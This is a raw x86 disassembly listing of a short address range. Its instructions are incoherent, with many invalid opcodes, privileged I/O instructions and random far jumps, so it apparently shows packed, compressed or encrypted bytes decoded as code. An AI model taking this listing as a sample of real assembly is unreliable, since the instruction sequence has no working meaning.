  405af4:	js     0x405b12
  405af6:	pop    ss
  405af7:	jmp    0x8f76:0xc1320eb8
  405afe:	aas    
  405aff:	add    BYTE PTR [edi-0x60],ch
  405b02:	jg     0x405b30
  405b04:	sbb    edi,DWORD PTR [eax+0x10]
  405b07:	jbe    0x405b16
  405b09:	or     DWORD PTR [edi-0x3cab567e],edx
  405b0f:	les    esi,FWORD PTR ds:0x19f68144
  405b15:	jb     0x405b38
  405b17:	xchg   esi,eax
  405b18:	jns    0x405b90
  405b1a:	xchg   edi,eax
  405b1b:	cli    
  405b1c:	ja     0x405ac5
  405b1e:	(bad)  
  405b1f:	es mov ah,0x5a
  405b22:	sbb    BYTE PTR [ecx],cl
  405b24:	inc    ecx
  405b25:	inc    esi
  405b26:	jecxz  0x405b8e
  405b28:	arpl   WORD PTR [esi],dx
  405b2a:	sti    
  405b2b:	cmp    BYTE PTR [edi+0x29f54d85],dl
  405b31:	push   cs
  405b32:	and    dh,BYTE PTR [edx-0x38]
  405b35:	popf   
  405b36:	jbe    0x405b94
  405b38:	mov    eax,0xcf1849dd
  405b3d:	mov    dh,0xf9
  405b3f:	dec    esi
  405b40:	sti    
  405b41:	loope  0x405acb
  405b43:	loop   0x405b6a
  405b45:	inc    esp
  405b46:	push   esi
  405b47:	in     al,0x5c
  405b49:	add    eax,0xb547d150
  405b4e:	out    0x15,eax
  405b50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b51:	and    ebx,DWORD PTR [edx+0x37]
  405b54:	arpl   WORD PTR [edx],si
  405b56:	and    ch,bh
  405b58:	aam    0xfa
  405b5a:	rcr    ecx,1
  405b5c:	mov    ebx,0x633304f3
  405b61:	and    BYTE PTR [ebx+0x20ac6d68],ch
  405b67:	call   0x7b93:0x666acaa3
  405b6e:	inc    eax
  405b6f:	pop    ecx
  405b70:	jmp    DWORD PTR [edx+0x56]
  405b73:	fisttp WORD PTR ds:0x714b35b7
  405b79:	scas   eax,DWORD PTR es:[edi]
  405b7a:	in     eax,0x78
  405b7c:	xor    al,0xe3
  405b7e:	inc    edx
  405b7f:	or     dh,cl
  405b81:	mov    al,0xb8
  405b83:	push   ecx
  405b84:	or     BYTE PTR [ebx-0x21],cl
  405b87:	std    
  405b88:	push   esi
  405b89:	and    ch,ah
  405b8b:	xchg   ecx,eax
  405b8c:	and    ebx,eax
  405b8e:	mov    ch,0x9f
  405b90:	aad    0xd8
  405b92:	fisttp QWORD PTR [ebx-0x14992b79]
  405b98:	push   ds
  405b99:	les    ecx,FWORD PTR [ecx-0x5532c277]
  405b9f:	or     eax,0x4ac4873b
  405ba4:	push   edx
  405ba5:	add    BYTE PTR [ecx-0x22],al
  405ba8:	sub    esp,esi
  405baa:	pusha  
  405bab:	add    DWORD PTR [edi+0x6be3e440],ebx
  405bb1:	inc    edi
  405bb2:	pop    ebx
  405bb3:	pop    edx
  405bb4:	pop    ds
  405bb5:	xor    dl,BYTE PTR [ecx+0x1c]
  405bb8:	leave  
  405bb9:	shr    BYTE PTR [ebp+ebx*2+0x50],1
  405bbd:	push   ebx
  405bbe:	dec    edi
  405bbf:	mov    DWORD PTR [ebx+esi*1],ebp
  405bc2:	fs mov ebx,0xfd7c8232
  405bc8:	mov    bh,0xb2
  405bca:	div    bh
  405bcc:	repnz xchg esi,eax
  405bce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bcf:	shr    edi,cl
  405bd1:	pcmpeqb mm7,QWORD PTR [esi-0x4be31c39]
  405bd8:	push   ds
  405bd9:	mov    ecx,0x57825f85
  405bde:	inc    DWORD PTR [edx]
  405be0:	lock dec edi
  405be2:	loope  0x405b65
  405be4:	mov    edi,0x4cb6eda
  405be9:	add    al,0x80
  405beb:	fwait
  405bec:	pop    eax
  405bed:	sub    eax,0x8b4396cd
  405bf2:	into   
  405bf3:	jge    0x405c19
  405bf5:	and    eax,DWORD PTR [edx+0x14a8c5c5]
  405bfb:	hlt    
  405bfc:	and    al,0xa
  405bfe:	xchg   BYTE PTR [ebx],al
  405c00:	and    ah,bh
  405c02:	pop    edi
  405c03:	leave  
  405c04:	dec    ecx
  405c05:	les    ebx,FWORD PTR [esi+0x2a]
  405c08:	adc    eax,0x70d3e9e6
  405c0d:	mov    eax,0x50dd2118
  405c12:	mov    edi,DWORD PTR [esi-0x6a06136]
  405c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c19:	adc    al,0x92
  405c1b:	jle    0x405bcc
  405c1d:	fmul   QWORD PTR [ebp+0x598c3d4]
  405c23:	cmp    eax,0x7b193caa
  405c28:	jmp    0x405be4
  405c2a:	int    0xde
  405c2c:	jmp    0x405ca8
  405c2e:	lods   al,BYTE PTR ds:[esi]
  405c2f:	outs   dx,DWORD PTR ds:[esi]
  405c30:	adc    ecx,DWORD PTR [ebx-0x5114e53a]
  405c36:	xchg   edi,eax
  405c37:	jge    0x405bd1
  405c39:	cli    
  405c3a:	sbb    BYTE PTR [eax+0x26],dh
  405c3d:	lods   eax,DWORD PTR ds:[esi]
  405c3e:	mov    edx,?
  405c40:	das    
  405c41:	lds    ebp,FWORD PTR [edx+0x3e768d13]
  405c47:	repnz push 0xffffff8e
  405c4a:	fsubrp st(6),st
  405c4c:	mov    esp,0x6e5a0e22
  405c51:	ins    DWORD PTR es:[edi],dx
  405c52:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  405c54:	stos   BYTE PTR es:[edi],al
  405c55:	mov    edi,esi
  405c57:	inc    edi
  405c58:	popa   
  405c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c5a:	ficomp WORD PTR [edx]
  405c5c:	inc    ecx
  405c5d:	fist   WORD PTR [eax-0x44ff99fd]
  405c63:	shr    BYTE PTR [ebx+edi*1+0x3e],1
  405c67:	and    al,0xb6
  405c69:	fwait
  405c6a:	imul   edx,DWORD PTR [eax],0x19a01e24
  405c70:	(bad)  
  405c71:	add    eax,0x71c48379
  405c76:	cdq    
  405c77:	push   esp
  405c78:	add    eax,0xc12febd0
  405c7d:	xchg   DWORD PTR [ecx],edi
  405c7f:	sbb    ah,BYTE PTR [ebx+0x6]
  405c82:	inc    esi
  405c83:	lods   al,BYTE PTR ds:[esi]
  405c84:	push   eax
  405c85:	jmp    0xe6d1:0xfc9bafee
  405c8c:	jns    0x405ce7
  405c8e:	int3   
  405c8f:	test   eax,0x2604659
  405c94:	in     al,0xe8
  405c96:	sbb    edx,ebp
  405c98:	mov    BYTE PTR [ecx],dl
  405c9a:	mov    ds:0xcd150544,eax
  405c9f:	scas   al,BYTE PTR es:[edi]
  405ca0:	dec    edx
  405ca1:	sub    al,0xc2
  405ca3:	les    edi,FWORD PTR [edi+0x5a]
  405ca6:	adc    dh,BYTE PTR [ebx+0x20]
  405ca9:	cld    
  405caa:	test   BYTE PTR [edi],ch
  405cac:	or     DWORD PTR [esi+esi*4-0x5b],ecx
  405cb0:	bound  edi,QWORD PTR [eax]
  405cb2:	bound  edi,QWORD PTR [esi+0x5c6fd24e]
  405cb8:	adc    eax,0xb6cb1e9f
  405cbd:	ror    DWORD PTR [edx+edi*1],cl
  405cc0:	xchg   BYTE PTR [ecx],dh
  405cc2:	push   ebp
  405cc3:	cwde   
  405cc4:	add    eax,0xa9281b93
  405cc9:	out    0x6e,eax
  405ccb:	add    al,0xd7
  405ccd:	inc    ebx
  405cce:	repnz push edx
  405cd0:	sbb    DWORD PTR [esi+0x36],0x28
  405cd4:	data16 mov WORD PTR [esi+0x6c],gs
  405cd8:	ret    0xb381
  405cdb:	icebp  
  405cdc:	retf   0x4dc8
  405cdf:	test   esp,esi
  405ce1:	(bad)  
  405ce2:	mov    edx,0x57332801
  405ce7:	mov    edi,DWORD PTR [ecx-0x6f]
  405cea:	icebp  
  405ceb:	fisubr DWORD PTR [ebx]
  405ced:	cmc    
  405cee:	sahf   
  405cef:	test   DWORD PTR [esi+0x52f6b3a6],edi
  405cf5:	mov    DWORD PTR [ecx-0x5a],ebx
  405cf8:	sbb    DWORD PTR [ecx+esi*8],0xffffffc5
  405cfc:	js     0x405d32
  405cfe:	jecxz  0x405c8d
  405d00:	sub    DWORD PTR [ecx+0x1a],esi
  405d03:	mov    eax,ds:0xed7163cc
  405d08:	sti    
  405d09:	mov    esi,0xbdd538ba
  405d0e:	and    ebp,edi
  405d10:	add    bl,bl
  405d12:	push   eax
  405d13:	jmp    DWORD PTR [ecx+esi*1+0x5b66b9c7]
  405d1a:	mov    ebp,0x57c1e7a7
  405d1f:	xchg   esi,eax
  405d20:	test   BYTE PTR [eax+ecx*2],0x88
  405d24:	fist   DWORD PTR [ecx+0x27]
  405d27:	call   0xb5b29f36
  405d2c:	mov    edx,0x276155b5
  405d31:	jp     0x405cd1
  405d33:	push   ebp
  405d34:	and    BYTE PTR [ebx+0x6e],al
  405d37:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d39:	xor    al,0xea
  405d3b:	cdq    
  405d3c:	(bad)  
  405d3d:	gs mov edi,0x107b1e05
  405d43:	adc    ebx,DWORD PTR [edi+0x53]
  405d46:	add    ecx,DWORD PTR [eax]
  405d48:	push   ds
  405d49:	mov    BYTE PTR [ebx+0x10],ah
  405d4c:	test   BYTE PTR ss:[esi+0x765ba4f5],al
  405d53:	shl    DWORD PTR [edi],1
  405d55:	mov    esi,ecx
  405d57:	mov    dh,0x69
  405d59:	jae    0x405d68
  405d5b:	test   DWORD PTR [ebx],ebx
  405d5d:	adc    dl,BYTE PTR ds:0x723c0508
  405d63:	shl    DWORD PTR [ebx+ecx*4],1
  405d66:	test   DWORD PTR [ebp+0x64],0x2e451e12
  405d6d:	add    ebp,edx
  405d6f:	or     BYTE PTR [edx-0x5b],0xe1
  405d73:	xlat   BYTE PTR ds:[ebx]
  405d74:	pop    eax
  405d75:	or     ecx,DWORD PTR [esi+0x60fe7c13]
  405d7b:	mov    BYTE PTR [edx],dl
  405d7d:	ja     0x405d4b
  405d7f:	sbb    bl,dl
  405d81:	add    BYTE PTR [esi-0x57dc5b83],0x53
  405d88:	pop    ebp
  405d89:	cli    
  405d8a:	pop    edi
  405d8b:	call   0x3279e001
  405d90:	adc    bh,BYTE PTR [edi-0x7ddc813c]
  405d96:	pop    ss
  405d97:	pop    esp
  405d98:	pop    eax
  405d99:	push   esi
  405d9a:	leave  
  405d9b:	daa    
  405d9c:	xchg   ecx,eax
  405d9d:	fidivr DWORD PTR [ebx-0x5d]
  405da0:	add    esp,DWORD PTR [edx-0x34a22c4a]
  405da6:	dec    edx
  405da7:	or     eax,0xd5b45642
  405dac:	stos   BYTE PTR es:[edi],al
  405dad:	xchg   esp,eax
  405dae:	xchg   ebx,eax
  405daf:	in     al,0x8
  405db1:	fsub   QWORD PTR [ebx]
  405db3:	clc    
  405db4:	sbb    al,0x8e
  405db6:	shl    DWORD PTR [edi],0xda
  405db9:	push   esp
  405dba:	mov    dh,bh
  405dbc:	lds    esp,FWORD PTR [edx]
  405dbe:	dec    eax
  405dbf:	mov    WORD PTR [eax-0x8072448],?
  405dc5:	mov    eax,0xee5afac0
  405dca:	jne    0x405e36
  405dcc:	sub    al,0x8a
  405dce:	loope  0x405dc0
  405dd0:	mov    ebp,0xfc6d24d
  405dd5:	outs   dx,DWORD PTR ds:[esi]
  405dd6:	pop    edi
  405dd7:	fs cs hlt 
  405dda:	lods   al,BYTE PTR ds:[esi]
  405ddb:	and    eax,0x8bccfcac
  405de0:	and    BYTE PTR [edx-0x2ef05739],bh
  405de6:	cmp    esp,eax
  405de8:	and    DWORD PTR [esi-0x15530b2a],edx
  405dee:	cmp    DWORD PTR [ebp-0x540885a0],esi
  405df4:	mov    eax,ds:0xf24dae7d
  405df9:	pop    edi
  405dfa:	or     BYTE PTR [edi],cl
  405dfc:	xor    al,0x92
  405dfe:	or     edx,DWORD PTR [edx+0x6317ff9b]
  405e04:	or     edx,DWORD PTR [ebx+esi*8-0x70]
  405e08:	sbb    BYTE PTR [ecx+0x3db61091],0x98
  405e0f:	dec    ebx
  405e10:	pop    ds
  405e11:	dec    edi
  405e12:	xchg   bl,bh
  405e14:	push   eax
  405e15:	push   ebp
  405e16:	inc    edi
  405e17:	mov    ds:0x6126a539,al
  405e1c:	sbb    BYTE PTR [ebx],cl
  405e1e:	(bad)  
  405e1f:	test   al,0x98
  405e21:	pop    edx
  405e22:	push   0xffffff9c
  405e24:	in     eax,dx
  405e25:	inc    BYTE PTR [esi+ebp*4+0xe85fb0d]
  405e2c:	mov    ds,esi
  405e2e:	xchg   esp,eax
  405e2f:	retf   
  405e30:	dec    edx
  405e31:	loop   0x405e62
  405e33:	iret   
  405e34:	sbb    BYTE PTR [edi+0x44],al
  405e37:	hlt    
  405e38:	test   al,0x89
  405e3a:	dec    edi
  405e3b:	cwde   
  405e3c:	xchg   cl,dl
  405e3e:	scas   al,BYTE PTR es:[edi]
  405e3f:	xor    eax,0xda108f20
  405e44:	push   esi
  405e45:	inc    edx
  405e46:	adc    eax,0xb0338359
  405e4b:	fcom   QWORD PTR [eax-0x169126c5]
  405e51:	icebp  
  405e52:	(bad)
  405e57:	ds pop ss
  405e59:	add    cl,bh
  405e5b:	and    ah,BYTE PTR [ecx-0x52]
  405e5e:	fimul  WORD PTR [ecx-0x76]
  405e61:	fs gs pop edi
  405e64:	test   eax,0xbee849d8
  405e69:	cmp    al,0x2e
  405e6b:	xchg   esp,eax
  405e6c:	pop    ss
  405e6d:	pop    esi
  405e6f:	sub    al,0xf1
  405e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e72:	into   
  405e73:	mov    al,ds:0x12f376b0
  405e78:	or     BYTE PTR [edx-0x4f7dd0f6],bl
  405e7e:	sbb    al,0xc4
  405e80:	lods   eax,DWORD PTR ds:[esi]
  405e81:	addr16 (bad) 
  405e83:	rcl    BYTE PTR [esi+0x6064b46c],1
  405e89:	dec    edi
  405e8a:	mov    esp,0xae7c42d0
  405e8f:	push   ds
  405e90:	aam    0x72
  405e92:	pop    esi
  405e93:	mov    cl,cl
  405e95:	gs or  al,0xf4
  405e98:	pop    ds
  405e99:	inc    ebx
  405e9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e9b:	idiv   BYTE PTR [eax-0x7b]
  405e9e:	lock fwait
  405ea0:	test   BYTE PTR [edx+edx*1-0x3f5819f3],dh
  405ea7:	push   DWORD PTR [ebx-0x3b]
  405eaa:	sub    al,0x61
  405eac:	jbe    0x405e48
  405eae:	sub    al,al
  405eb0:	cdq    
  405eb1:	in     eax,dx
  405eb2:	xchg   edi,eax
  405eb3:	enter  0x572f,0xe6
  405eb7:	stc    
  405eb8:	push   cs
  405eb9:	jle    0x405e41
  405ebb:	or     al,0x5e
  405ebd:	xchg   BYTE PTR [eax-0x7398042b],ah
  405ec3:	sti    
  405ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ec5:	loop   0x405ea2
  405ec7:	ins    BYTE PTR es:[edi],dx
  405ec8:	xor    eax,0x1884a54d
  405ecd:	xchg   esi,eax
  405ece:	push   esp
  405ecf:	int3   
  405ed0:	push   es
  405ed1:	stos   DWORD PTR es:[edi],eax
  405ed2:	pusha  
  405ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ed4:	sub    eax,0x49d75a40
  405ed9:	sbb    DWORD PTR [eax+0x78],edx
  405edc:	arpl   WORD PTR [eax],dx
  405ede:	jle    0x405f3e
  405ee0:	sar    BYTE PTR [ebp+0x5bb3f881],1
  405ee6:	push   ebx
  405ee7:	rcl    DWORD PTR [ebp-0x50],1
  405eea:	stc    
  405eeb:	scas   eax,DWORD PTR es:[edi]
  405eec:	push   esi
  405eed:	and    al,0xd6
  405eef:	pushf  
  405ef0:	ins    DWORD PTR es:[edi],dx
  405ef1:	fwait
  405ef2:	scas   eax,DWORD PTR es:[edi]
  405ef3:	push   eax
  405ef4:	fld    TBYTE PTR [esi]
  405ef6:	sub    edx,DWORD PTR [ecx]
  405ef8:	add    dh,BYTE PTR [edx-0x3d]
  405efb:	jne    0x405f30
  405efd:	dec    BYTE PTR [esi-0x6c]
  405f00:	aam    0xa8
  405f02:	(bad)  
  405f03:	jmp    0x80bc122
  405f08:	int3   
  405f09:	xor    edx,DWORD PTR [ebx]
  405f0b:	repz das 
  405f0d:	sbb    eax,0xaa610220
  405f12:	outs   dx,BYTE PTR ds:[esi]
  405f13:	adc    BYTE PTR [esi-0x55],0x77
  405f17:	xor    BYTE PTR [edx+ebx*4],cl
  405f1a:	out    dx,eax
  405f1b:	cmp    edx,DWORD PTR [ecx+0x5]
  405f1e:	fadd   DWORD PTR [ebx]
  405f20:	inc    eax
  405f21:	pop    edi
  405f22:	stos   BYTE PTR es:[edi],al
  405f23:	daa    
  405f24:	push   ebx
  405f25:	int    0x2f
  405f27:	arpl   WORD PTR [ebx],si
  405f29:	jg     0x405f12
  405f2b:	cli    
  405f2c:	mov    bl,BYTE PTR [ecx-0xd790cb8]
  405f32:	out    0xed,eax
  405f34:	mov    ebp,DWORD PTR [edx]
  405f36:	push   ebx
  405f37:	clc    
  405f38:	dec    ebp
  405f39:	jmp    DWORD PTR [ebx+0x53]
  405f3c:	scas   eax,DWORD PTR es:[edi]
  405f3d:	mov    esi,0x7cf58503
  405f42:	xlat   BYTE PTR ds:[ebx]
  405f43:	cmp    DWORD PTR [ebx+edx*8],ecx
  405f46:	jp     0x405f72
  405f48:	xchg   esi,eax
  405f49:	jmp    0x405f91
  405f4b:	scas   al,BYTE PTR es:[edi]
  405f4c:	jl     0x405f21
  405f4e:	int3   
  405f4f:	(bad)  
  405f50:	xor    BYTE PTR [edi*1-0x5f8b8429],al
  405f57:	ret    0x6775
  405f5a:	inc    edi
  405f5b:	mov    WORD PTR [eax+0x3a70b293],cs
  405f61:	dec    esp
  405f62:	pop    edx
  405f63:	sub    esp,DWORD PTR [ebx+0x6f96eefe]
  405f69:	jns    0x405fe5
  405f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f6c:	mov    ecx,edi
  405f6e:	aam    0xc1
  405f70:	or     BYTE PTR [eax-0x724f30b3],dh
  405f76:	mov    ds:0x2e00b511,al
  405f7b:	imul   edi,DWORD PTR [ebx],0xc5c098fa
  405f81:	retf   
  405f82:	xchg   esi,eax
  405f83:	jle    0x405f84
  405f85:	sar    eax,cl
  405f87:	jl     0x405fb7
  405f89:	into   
  405f8a:	inc    eax
  405f8b:	into   
  405f8c:	ret    
  405f8d:	mov    esp,0x614d495e
  405f92:	dec    esp
  405f93:	jae    0x405f5b
  405f95:	icebp  
  405f96:	idiv   DWORD PTR [eax-0x14]
  405f99:	shl    BYTE PTR [ecx+esi*2-0x6e],cl
  405f9d:	ret    
  405f9e:	(bad)  
  405f9f:	daa    
  405fa0:	imul   edx,esi,0x68
  405fa3:	test   dl,dh
  405fa5:	arpl   WORD PTR [bx+di-0x14cb],sp
  405faa:	push   ecx
  405fab:	mov    ch,0x84
  405fad:	imul   ebp,DWORD PTR [edi],0xffffffa6
  405fb0:	adc    BYTE PTR [ecx+0x24a4fe26],dh
  405fb6:	mov    al,0xeb
  405fb8:	inc    esi
  405fb9:	xchg   esi,eax
  405fba:	adc    eax,0x1a74d5f7
  405fbf:	mov    BYTE PTR [ebp-0x12],al
  405fc2:	dec    ebx
  405fc3:	std    
  405fc4:	inc    ebp
  405fc5:	mov    WORD PTR [edi],es
  405fc7:	fs xor bh,ch
  405fca:	scas   al,BYTE PTR es:[edi]
  405fcb:	in     eax,dx
  405fcc:	jge    0x405fdf
  405fce:	test   eax,0x8fdbed2b
  405fd3:	push   0xf
  405fd5:	mov    al,ds:0x94d95f88
  405fda:	call   0xcdad:0x7ca2bacf
  405fe1:	popf   
  405fe2:	push   ds
  405fe3:	repz repz jnp 0x405fb8
  405fe7:	in     al,dx
  405fe8:	xchg   cl,dh
  405fea:	inc    esp
  405feb:	xchg   ebp,eax
  405fec:	sub    ecx,DWORD PTR [ebp+0x607d5611]
  405ff2:	xchg   ebp,eax
  405ff3:	icebp  
  405ff4:	je     0x405f8a
  405ff6:	ja     0x406050
  405ff8:	shl    DWORD PTR [eax-0x644c1c9a],cl
  405ffe:	cmp    BYTE PTR [edi],dl
  406000:	sub    BYTE PTR [eax-0x69fbbec1],0x8b
  406007:	jmp    0x40602c
  406009:	loop   0x40606a
  40600b:	sbb    al,0xd3
  40600d:	adc    eax,0x6a979fa0
  406012:	jg     0x405fdf
  406014:	int3   
  406015:	xor    DWORD PTR [eax+0x2f2f5b58],ebx
  40601b:	sub    DWORD PTR [edi-0x2783f1f0],ecx
  406021:	adc    eax,0x49ff155
  406026:	fwait
  406027:	push   ebp
  406028:	jmp    0xfe5f:0xd9364481
  40602f:	repnz mov dl,ch
  406032:	mov    ah,0xee
  406034:	cs enter 0x1eb3,0x8
  406039:	je     0x406010
  40603b:	mov    cl,0x91
  40603d:	push   ebx
  40603e:	les    ebx,FWORD PTR [ecx]
  406040:	fidivr WORD PTR [edi+0x7c]
  406043:	xor    edx,DWORD PTR [edx+0x37d9984]
  406049:	test   eax,0x8f4bed7c
  40604e:	pusha  
  40604f:	dec    esi
  406050:	imul   ebp,DWORD PTR [edx+0x75c56ca9],0x35
  406057:	sti    
  406058:	xor    al,0x2b
  40605a:	and    BYTE PTR [esi-0x12],bl
  40605d:	jnp    0x4060cc
  40605f:	stos   DWORD PTR es:[edi],eax
  406060:	xor    dh,BYTE PTR [edi+0x33]
  406063:	jns    0xf20c3773
  406069:	jmp    0x4060e3
  40606b:	xchg   ebx,eax
  40606c:	leave  
  40606d:	scas   eax,DWORD PTR es:[edi]
  40606e:	into   
  40606f:	dec    ecx
  406070:	xchg   edx,eax
  406071:	jg     0x406070
  406073:	movups XMMWORD PTR [ebx],xmm7
  406076:	or     BYTE PTR [ecx],ch
  406078:	cdq    
  406079:	lahf   
  40607a:	cmp    BYTE PTR [esi],0x10
  40607d:	add    eax,0x591722b2
  406082:	popf   
  406083:	(bad)  
  406084:	gs and BYTE PTR cs:[edi],bl
  406088:	mov    ebx,0x42c88256
  40608d:	add    DWORD PTR [ecx-0x17],eax
  406090:	mov    ch,0xac
  406092:	lods   al,BYTE PTR ds:[esi]
  406093:	(bad)  [ebx]
  406095:	xor    ah,BYTE PTR [edi+0x7c73df05]
  40609b:	test   al,0x18
  40609d:	xchg   edx,eax
  40609e:	and    al,BYTE PTR [edx]
  4060a0:	pushf  
  4060a1:	jno    0x4060cf
  4060a3:	out    dx,al
  4060a4:	push   es
  4060a5:	xor    BYTE PTR [ecx+0x74],bh
  4060a8:	adc    al,0x95
  4060aa:	xchg   DWORD PTR [edx],edi
  4060ac:	jle    0x406090
  4060ae:	popa   
  4060af:	ss sahf 
  4060b1:	int3   
  4060b2:	or     ecx,ecx
  4060b4:	push   ds
  4060b5:	xchg   ebp,eax
  4060b6:	xchg   BYTE PTR [edx],cl
  4060b8:	mov    dl,cl
  4060ba:	fcomip st,st(5)
  4060bc:	loopne 0x406090
  4060be:	jmp    0xae266bb7
  4060c3:	xor    BYTE PTR [eax-0xa694200],bh
  4060c9:	fadd   QWORD PTR [edi+0x3d]
  4060cc:	dec    esp
  4060cd:	mov    DWORD PTR [edi],ebx
  4060cf:	das    
  4060d0:	adc    BYTE PTR [esi-0x8],dl
  4060d3:	(bad)  
  4060d4:	std    
  4060d5:	jp     0x406086
  4060d7:	sti    
  4060d8:	xor    al,0xa1
  4060da:	cmp    al,0x3c
  4060dc:	dec    eax
  4060dd:	jg     0x4060f7
  4060df:	push   ss
  4060e0:	sub    al,0xc2
  4060e2:	pusha  
  4060e3:	loope  0x406091
  4060e5:	loopne 0x4060df
  4060e7:	sbb    edx,0xb25dfa0c
  4060ed:	add    eax,0xe1e8e3da
  4060f2:	push   cs
  4060f3:	call   FWORD PTR [eax+0x61afccc7]
  4060f9:	fwait
  4060fa:	ror    ebx,0x50
  4060fd:	inc    eax
  4060fe:	jnp    0x40615d
  406100:	pop    ebx
  406101:	mov    dh,0x27
  406103:	xchg   ecx,eax
  406104:	or     al,0x55
  406106:	aad    0xc8
  406108:	xchg   ebp,eax
  406109:	inc    ecx
  40610a:	adc    bh,BYTE PTR [edi]
  40610c:	sti    
  40610d:	cs inc ebp
  40610f:	mov    DWORD PTR [esi-0x52],eax
  406112:	or     eax,0x5434061d
  406117:	mov    DWORD PTR [eax],edi
  406119:	out    dx,al
  40611a:	fwait
  40611b:	btc    DWORD PTR [edx+0x24],ebp
  40611f:	fsub   DWORD PTR [edx]
  406121:	inc    ebp
  406122:	jnp    0x4060a5
  406124:	cmp    ebx,DWORD PTR [ecx]
  406126:	int3   
  406127:	push   0xf451a135
  40612c:	lea    edx,[ebx-0x33]
  40612f:	add    ebp,DWORD PTR [esi-0x6d]
  406132:	shr    bl,0x85
  406135:	jmp    FWORD PTR [edx-0x1b]
  406138:	in     eax,dx
  406139:	outs   dx,DWORD PTR ds:[esi]
  40613a:	xor    ah,0x49
  40613d:	adc    al,0xa0
  40613f:	cdq    
  406140:	call   0xd9d2:0x77cd2f5d
  406147:	inc    esp
  406148:	ds pop edx
  40614a:	aaa    
  40614b:	xor    dh,BYTE PTR [ebp+0x55]
  40614e:	ds push 0x6c
  406151:	xor    ch,BYTE PTR [esp+esi*1]
  406154:	icebp  
  406155:	ret    0x7948
  406158:	or     al,0xc8
  40615a:	(bad)  
  40615c:	inc    ebx
  40615d:	xchg   ecx,eax
  40615e:	jnp    0x406131
  406160:	popf   
  406161:	xor    DWORD PTR [ecx-0x125bd19a],edx
  406167:	cwde   
  406168:	repnz ins DWORD PTR es:[edi],dx
  40616a:	sbb    DWORD PTR [ebx-0x1df6e9c3],ecx
  406170:	inc    edi
  406171:	mov    WORD PTR [edi],gs
  406173:	les    edi,FWORD PTR [ebp-0x68]
  406176:	loopne 0x40618b
  406178:	shl    BYTE PTR [esp+esi*4-0x3f],0x7a
  40617d:	pop    ebp
  40617e:	out    0x4,al
  406180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406181:	push   cs
  406182:	test   BYTE PTR [eax+0x640489af],0x88
  406189:	sbb    eax,0x9c779fda
  40618e:	sub    dl,ah
  406190:	or     DWORD PTR [eax],esi
  406192:	nop
  406193:	xor    dh,ah
  406195:	mov    cl,0xfe
  406197:	xchg   esp,eax
  406198:	js     0x406202
  40619a:	aas    
  40619b:	add    DWORD PTR [edx-0x2c8b513d],edi
  4061a1:	push   edx
  4061a2:	mov    al,0x3f
  4061a4:	mov    esp,0x1a42c73
  4061a9:	mov    dh,0xc7
  4061ab:	out    0x2,eax
  4061ad:	ret    
  4061ae:	jne    0x40621b
  4061b0:	les    edi,FWORD PTR [eax+0x141a2ccc]
  4061b6:	shl    BYTE PTR [edx+edi*2-0x72],0x80
  4061bb:	repnz and BYTE PTR [edi-0x60],ah
  4061bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061c0:	loope  0x40618a
  4061c2:	add    edx,DWORD PTR [edi-0x76]
  4061c5:	ja     0x4061be
  4061c7:	ds loop 0x406158
  4061ca:	jle    0x406187
  4061cc:	aam    0x69
  4061ce:	sbb    eax,0x27df96d
  4061d3:	lods   al,BYTE PTR ds:[esi]
  4061d4:	adc    DWORD PTR [eax+edi*1-0x41],0xffffff95
  4061d9:	scas   eax,DWORD PTR es:[edi]
  4061da:	or     BYTE PTR [esp+edx*1-0x5ac14429],dh
  4061e1:	dec    esp
  4061e2:	add    al,0xc2
  4061e4:	icebp  
  4061e5:	push   esp
  4061e6:	not    DWORD PTR [edx+0x32]
  4061e9:	out    dx,al
  4061ea:	mov    ecx,DWORD PTR [ebx+0x1d592e9f]
  4061f0:	pop    eax
  4061f1:	sbb    BYTE PTR [ecx-0x1f49929c],ah
  4061f7:	aaa    
  4061f8:	xchg   esi,eax
  4061f9:	or     esi,DWORD PTR [ebx]
  4061fb:	xchg   ecx,eax
  4061fc:	pop    ss
  4061fd:	in     eax,dx
  4061fe:	xor    al,0xf9
  406200:	sbb    eax,0x77350d3b
  406205:	imul   ecx,DWORD PTR [esi+0x15],0x7be7e424
  40620c:	adc    BYTE PTR [eax+0x444b10d1],dl
  406212:	(bad)  
  406213:	xchg   esp,eax
  406214:	(bad)  
  406215:	ror    DWORD PTR [edi],1
  406217:	adc    eax,0xca34975f
  40621c:	unpckhps xmm5,XMMWORD PTR [edx]
  40621f:	mov    dl,0x80
  406221:	out    dx,eax
  406222:	sbb    bl,dh
  406224:	clc    
  406225:	xlat   BYTE PTR ds:[ebx]
  406226:	xor    DWORD PTR [eax],esi
  406228:	in     al,0xf1
  40622a:	push   edi
  40622b:	push   esp
  40622c:	inc    edx
  40622d:	ds (bad) 
  40622f:	dec    eax
  406230:	loopne 0x406290
  406232:	inc    ecx
  406233:	sbb    eax,esi
  406235:	jl     0x4061b9
  406237:	call   FWORD PTR [ebp+0xff4196f]
  40623d:	cs cdq 
  40623f:	nop
  406240:	pop    edi
  406241:	push   ecx
  406242:	inc    edx
  406243:	loope  0x406297
  406245:	push   0xffffff89
  406247:	aaa    
  406248:	mov    ah,0xc4
  40624a:	aas    
  40624b:	je     0x40623d
  40624d:	mov    ebp,0xba37462e
  406252:	inc    edi
  406253:	into   
  406254:	mov    DWORD PTR [esi-0x6d5306e9],ebx
  40625a:	cmp    ebx,DWORD PTR [ebx]
  40625c:	mov    WORD PTR [ebx+0x1fef0f0c],cs
  406262:	pushf  
  406263:	dec    esp
  406264:	scas   al,BYTE PTR es:[edi]
  406265:	jecxz  0x4062cc
  406267:	dec    esi
  406268:	mov    ch,0x77
  40626a:	jo     0x406204
  40626c:	outs   dx,BYTE PTR ds:[esi]
  40626d:	pop    esp
  40626e:	sbb    eax,0x2a529c9e
